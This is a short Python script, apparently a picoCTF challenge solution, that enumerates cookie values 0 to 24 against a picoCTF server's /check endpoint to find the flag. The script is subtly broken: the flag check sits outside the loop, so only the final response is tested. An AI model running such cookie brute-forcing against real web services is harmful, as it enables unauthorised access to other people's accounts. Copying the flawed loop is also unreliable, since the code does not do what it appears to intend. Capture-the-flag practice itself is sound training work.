import requests

url = "http://mercury.picoctf.net:21485/check"
for i in range(25):
    cookie = 'name={}'.format(i)
    headers = {'Cookie':cookie}
    r = requests.get(url, headers=headers)
    
if (r.status_code == 200) and ('picoCTF' in r.text):
    print(r.text)